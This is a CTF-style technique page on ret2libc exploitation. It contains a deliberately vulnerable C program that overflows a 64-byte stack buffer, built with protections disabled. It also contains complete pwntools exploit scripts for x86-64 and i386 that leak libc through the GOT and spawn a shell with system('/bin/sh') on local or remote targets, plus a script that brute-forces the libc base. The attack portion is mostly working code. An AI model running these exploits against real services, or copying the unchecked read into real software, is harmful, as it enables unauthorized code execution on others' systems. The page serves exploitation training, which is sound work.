---
title: "ret2libc - GOT Leak, libc Base, system(\"/bin/sh\")"
category: pwn
subcategory: ret2libc
type: technique
tags: [ret2libc, rop, gadget, libc-base, got, plt, aslr, movaps, puts, printf, system, write, libc-database, one-gadget, pwntools, ropper, checksec, gef, pwndbg, patchelf]
difficulty: medium
summary: "Leak a GOT entry through puts/write, fingerprint the libc, rebase it, return to main, then call system(\"/bin/sh\") in stage two."
when_to_use:
  - "NX is on, there is no win() function, and the binary has no /bin/sh string"
  - "The binary is dynamically linked and imports at least one output function (puts, write, printf)"
  - "You have a stack overflow that survives long enough to return to main a second time"
  - "ASLR is on so libc addresses must be leaked at runtime, not hardcoded"
  - "You have a libc.so.6 shipped with the challenge, or need to fingerprint an unknown one"
tools: [pwntools, ROPgadget, ropper, checksec, gdb, gef, pwndbg, libc-database, one_gadget, patchelf, ldd]
related: [rop-fundamentals, rop-ret2csu, rop-one-gadget, rop-got-overwrite, rop-stack-pivot, mitigation-libc-identification, mitigation-modern-playbook, stack-buffer-overflow-basics, stack-ret2win]
---

## TL;DR

The binary has no `system` and no `/bin/sh`, but libc has both. ASLR randomises where libc lands,
so stage one calls `puts(got['puts'])` to print a real libc address, then returns to `main` for a
second overflow. Subtract the known symbol offset to get the libc base; stage two calls
`system("/bin/sh")` with everything rebased. Two overflows, one leak, one shell.

## Recognise it

- `checksec`: `NX enabled`, `No canary found` (or you have a canary leak), dynamically linked.
  `Partial` or `Full RELRO` -- either is fine, you are *reading* the GOT, not writing it.
- The binary imports `puts`, `write` or `printf` (`objdump -d -j .plt ./vuln`).
- No `win`/`flag`/`backdoor` symbol, and `strings ./vuln | grep /bin/sh` is empty.
- The challenge ships a `libc.so.6` (and often `ld-linux-x86-64.so.2`) -- a very strong hint that
  ret2libc is the intended path.

## Vulnerable source

```c
/* vuln.c - no win function, no /bin/sh, just an overflow */
#include <stdio.h>
#include <unistd.h>

void vuln(void) {
    char buf[64];
    puts("input:");
    read(0, buf, 0x100);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

```sh
# x86-64: NX on, no canary, no PIE so the PLT/GOT addresses are fixed
gcc -fno-stack-protector -no-pie -z noexecstack -o vuln vuln.c
# the same source as a 32-bit binary, for the cdecl variant
gcc -m32 -fno-stack-protector -no-pie -z noexecstack -o vuln32 vuln.c

ldd ./vuln              # which libc will actually be used at runtime
checksec --file=./vuln
```

## Theory

### The GOT is a leak oracle

A dynamically linked binary calls `puts` through the PLT, which jumps through a slot in the
`.got.plt` table. After the first call to `puts`, that slot holds the **runtime address of `puts`
inside libc**, so `libc_base = leaked_puts_runtime - libc.symbols['puts']`.

Every other libc symbol is then `libc_base + libc.symbols[name]`, and `/bin/sh` is
`libc_base + next(libc.search(b"/bin/sh\x00"))`. ASLR randomises the base but never the internal
layout: offsets within a given libc build are constant. That is the entire trick.

### Why you need two stages

Stage one must *print* the leak, so the program has to survive the chain and hand control back.
Ending the chain with the address of `main` (or the function containing the overflow) re-runs the
vulnerable `read()`, giving you a second, fully informed chain.

```
stage 1: [pad][pop rdi ; ret][got.puts][puts@plt][main]
         ------------------------------------------ leaks, then restarts
stage 2: [pad][ret][pop rdi ; ret][&/bin/sh][system]
```

### x86-64 vs i386 layout

On x86-64 arguments go in registers, so you need `pop rdi ; ret`. Non-PIE binaries almost always
have one inside `__libc_csu_init`; if not, take it from libc in stage two.

On i386, cdecl puts arguments on the stack *after* the return address, so both stages are a
flat three-word pattern:

```
stage 1: [ puts@plt ][ main    ][ got.puts ]
stage 2: [ system   ][ exit@plt][ &/bin/sh ]
              ^ called    ^ where it returns   ^ its single argument
```

That middle slot is `exit@plt` for a clean close, or `0xdeadbeef` if you do not care.

### Identifying an unknown libc

If the challenge does not ship a libc, leak **two** symbols (`puts` and `printf`, or `read` and
`write`) and search a database by their low 12 bits, which ASLR never changes because pages are
4 KiB aligned. One symbol is usually ambiguous; two almost always pins it.

```sh
./libc-database/find puts 5f0 printf 800
./libc-database/dump libc6_2.35-0ubuntu3_amd64 puts system str_bin_sh
```

See `mitigation-libc-identification` for the full fingerprinting workflow.

### The movaps alignment trap

Modern glibc `system()` calls `do_system`, which uses SSE instructions such as
`movaps xmmword ptr [rsp+0x50], xmm0`. `movaps` needs a 16-byte aligned address, and the ABI
guarantees `rsp % 16 == 0` at the *entry* of any function -- which your chain breaks, because each
gadget address is 8 bytes.

Symptom: SIGSEGV inside `do_system+...` at a `movaps` instruction, and no shell. Fix: one extra
bare `ret` gadget before the call, i.e. `rop.raw(rop.find_gadget(["ret"]).address)` immediately
before `rop.call(libc.symbols["system"], [binsh])`. If adding it breaks a chain that previously
worked, remove it: alignment depends on how many slots the chain already consumed.

## Gadget shopping list

```sh
# x86-64: the only two gadgets you need - an argument setter and a bare ret
ROPgadget --binary ./vuln --only "pop|ret" | grep "pop rdi"
ROPgadget --binary ./vuln --only "ret" | head

# from libc, once you have the base (far richer)
ROPgadget --binary ./libc.so.6 --only "pop|ret" | grep -E "pop (rdi|rsi|rdx)"
ROPgadget --binary ./libc.so.6 --string "/bin/sh"

# i386: no gadgets needed, cdecl is pure stack - just the PLT addresses
objdump -d -j .plt ./vuln32 | grep -E "puts|system|exit"
```

## Attack

1. `checksec`, `ldd`, and `ls` the challenge directory for a bundled `libc.so.6`.
2. Find the offset to saved RIP with `cyclic` + `cyclic_find`.
3. Build stage one: leak `got['puts']` via `puts@plt`, return to `main`.
4. Parse the leak. On x86-64 it arrives as up to 6 bytes plus `\n`; pad to 8 and `u64`.
5. Compute `libc_base = leak - libc.symbols['puts']`. It must end in `000`, otherwise you
   parsed the wrong bytes. With no libc file, leak a second symbol and run `libc-database`.
6. Build stage two: `ret` (alignment) + `pop rdi ; ret` + `&/bin/sh` + `system`.
7. If `system` misbehaves, try `one_gadget` instead. See `rop-one-gadget`.

## Exploit

```python
#!/usr/bin/env python3
"""ret2libc, x86-64, two stages: puts GOT leak -> return to main -> system("/bin/sh").

Local: ./exploit.py    Remote: ./exploit.py HOST PORT
Build: gcc -fno-stack-protector -no-pie -z noexecstack -o vuln vuln.c
"""
import sys

from pwn import *

BINARY = "./vuln"
LIBC = "./libc.so.6"          # challenge-provided libc; falls back to the system one
OFFSET = 72                   # 64 byte buffer + saved rbp; verify with cyclic

context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"
context.log_level = "info"


def start():
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    if args.GDB:
        return gdb.debug(BINARY, gdbscript="b *vuln+30\nc\n")
    return process(BINARY)


def load_libc(io):
    """Prefer the shipped libc; otherwise the one the local process mapped."""
    if os.path.exists(LIBC):
        return ELF(LIBC, checksec=False)
    if getattr(io, "libc", None) is not None:
        return io.libc
    log.failure("no libc available - supply %s or use libc-database", LIBC)
    sys.exit(1)


def stage_one(io):
    """Leak the runtime address of puts, then re-enter main."""
    rop = ROP(elf)
    rop.call("puts", [elf.got["puts"]])
    rop.raw(elf.symbols["main"])
    log.info("stage 1 chain:\n%s", rop.dump())

    io.recvuntil(b"input:")
    io.sendline(flat({OFFSET: rop.chain()}, filler=b"A"))
    io.recvline()                              # the newline puts() emits for our chain
    leak = u64(io.recvline().strip().ljust(8, b"\x00"))
    log.success("puts@libc = %#x", leak)
    return leak


def stage_two(io, libc):
    binsh = next(libc.search(b"/bin/sh\x00"))
    log.success("base=%#x  system=%#x  /bin/sh=%#x",
                libc.address, libc.symbols["system"], binsh)

    rop = ROP(libc)
    rop.raw(rop.find_gadget(["ret"]).address)  # movaps alignment fix
    rop.call(libc.symbols["system"], [binsh])
    log.info("stage 2 chain:\n%s", rop.dump())

    io.recvuntil(b"input:")
    io.sendline(flat({OFFSET: rop.chain()}, filler=b"B"))


def main():
    io = start()
    libc = load_libc(io)

    libc.address = stage_one(io) - libc.symbols["puts"]
    if libc.address & 0xFFF:
        log.warning("libc base %#x not page aligned - wrong symbol or bad parse", libc.address)

    stage_two(io, libc)
    io.sendline(b"id; cat flag.txt; cat /flag*")
    io.interactive()


if __name__ == "__main__":
    main()
```

### i386 variant

```python
#!/usr/bin/env python3
"""ret2libc on i386 (cdecl): stage one leaks via puts, stage two is the classic
[system][ret][binsh] three-word layout.

Local: ./exploit32.py    Remote: ./exploit32.py HOST PORT
Build: gcc -m32 -fno-stack-protector -no-pie -z noexecstack -o vuln32 vuln.c
"""
import sys

from pwn import *

BINARY = "./vuln32"
LIBC = "./libc.so.6"
OFFSET = 76                    # 64 byte buffer + saved ebp on i386; verify with cyclic

context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "i386"


def start():
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    return process(BINARY)


def main():
    io = start()
    libc = ELF(LIBC, checksec=False) if os.path.exists(LIBC) else io.libc

    # --- stage one: puts(got.puts) then return to main ----------------------
    payload = b"A" * OFFSET
    payload += p32(elf.plt["puts"])      # call puts
    payload += p32(elf.symbols["main"])  # puts returns into main
    payload += p32(elf.got["puts"])      # puts's single cdecl argument
    io.recvuntil(b"input:")
    io.sendline(payload)
    io.recvline()
    leak = u32(io.recvline().strip().ljust(4, b"\x00"))
    log.success("puts@libc = %#x", leak)

    libc.address = leak - libc.symbols["puts"]
    log.success("libc base = %#x  system = %#x", libc.address, libc.symbols["system"])

    # --- stage two: system("/bin/sh") ---------------------------------------
    payload = b"B" * OFFSET
    payload += p32(libc.symbols["system"])
    payload += p32(libc.symbols["exit"])   # where system returns; exit keeps it clean
    payload += p32(next(libc.search(b"/bin/sh\x00")))   # system's argument
    io.recvuntil(b"input:")
    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    main()
```

### No leak available: same-machine libc

If the service runs on the same host and architecture as your shell (common in "pwn the box"
setups, and in local practice with ASLR off), you can skip the leak entirely.

```python
#!/usr/bin/env python3
"""ret2libc with NO leak, two cases:
  1. ASLR off locally (echo 0 > /proc/sys/kernel/randomize_va_space) - fixed base.
  2. Only bits 12..20 randomised - brute force 2^9 candidate bases.

Local only: ./noleak.py
"""
from pwn import *

BINARY, LIBC, OFFSET = "./vuln", "/lib/x86_64-linux-gnu/libc.so.6", 72
context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"
context.log_level = "error"


def one_try(base_guess, libc):
    """Fire one chain assuming libc sits at base_guess. True on shell."""
    libc.address = base_guess
    rop = ROP(elf)
    rop.raw(rop.find_gadget(["ret"]).address)           # movaps alignment
    rop.raw(rop.find_gadget(["pop rdi", "ret"]).address)
    rop.raw(next(libc.search(b"/bin/sh\x00")))
    rop.raw(libc.symbols["system"])
    io = process(BINARY)
    try:
        io.recvuntil(b"input:")
        io.sendline(flat({OFFSET: rop.chain()}, filler=b"A"))
        io.sendline(b"echo PWNED")
        if b"PWNED" in io.recvrepeat(0.5):
            io.interactive()
            return True
    except EOFError:
        pass
    finally:
        libc.address = 0
    io.close()
    return False


def main():
    libc = ELF(LIBC, checksec=False)
    io = process(BINARY)                 # with ASLR off, /proc maps give the base
    base = io.libs()[os.path.realpath(LIBC)]
    io.close()
    log.warning("libc base from /proc: %#x", base)
    if one_try(base, libc):
        return
    for i in range(512):                 # 2^9 candidates when bits 12..20 move
        if one_try((base & ~0x1FF000) | (i << 12), libc):
            log.warning("hit on candidate %d", i)
            return
    log.warning("no hit - get a real leak instead")


if __name__ == "__main__":
    main()
```

## Variants & pitfalls

- **Wrong libc.** Off by a version means `system` is a few hundred bytes wrong: SIGSEGV or
  SIGILL. Always verify the computed base ends in `000`.
- **Leak parsing.** `puts` stops at the first null byte, so a 6-byte address arrives as 6 bytes
  plus `\n`: `u64(leak.ljust(8, b"\x00"))`. With `write(1, got, 8)` you get all 8.
- **`puts` prints nothing.** The GOT slot still holds the PLT stub because `puts` was never
  called before your chain -- leak a symbol the program has already used.
- **movaps SIGSEGV.** One extra `ret`. The most common "chain is right but no shell" cause.
- **`main` is not re-enterable.** Some challenges `exit()` or run a one-shot loop. Return to the
  vulnerable function directly, or leak and pop a shell in one chain with `one_gadget`.
- **PIE enabled.** Leak a binary address before using `elf.got` (a stack or format-string leak),
  then `elf.address = leak - offset`. **Full RELRO** is irrelevant: it blocks GOT writes, not reads.
- **`system` misbehaves** (restricted `$PATH`, odd `sh`): try `execve` via a syscall chain or
  `one_gadget`. If `/bin/sh` is missing from the libc search, look for `sh\x00`, or write the
  string into `.bss` yourself with a write-what-where gadget.
- **Remote glibc differs from local.** Run against the provided libc with
  `patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./vuln`, or
  `process([BINARY], env={"LD_PRELOAD": LIBC})`.
- **Stack too short for two chains?** Pivot into `.bss` first (`rop-stack-pivot`).
- **Need `rdx` too** (for `execve` with a real `envp`): see `rop-ret2csu`.

## Tools

| Tool | Use |
|---|---|
| `checksec --file=./vuln` / `ldd ./vuln` | Mitigations, and which libc the loader picks |
| `ROPgadget --binary ./vuln --only "pop\|ret"` | `pop rdi ; ret` and a bare `ret` |
| `ropper --file ./libc.so.6 --search "pop rdx"` | Extra argument gadgets once libc is known |
| `libc-database` (`./find`, `./dump`) | Fingerprint an unknown remote libc from leaked offsets |
| `one_gadget ./libc.so.6` | Single-address execve when a two-stage chain will not fit |
| `patchelf` | Run the binary against the challenge libc locally |
| `pwntools ROP.dump()` | Print the chain before sending it -- the fastest debug loop |
| `gdb` + `pwndbg` / `gef` | `vmmap`, `got`, `plt`, `libc` commands to check the leak live |
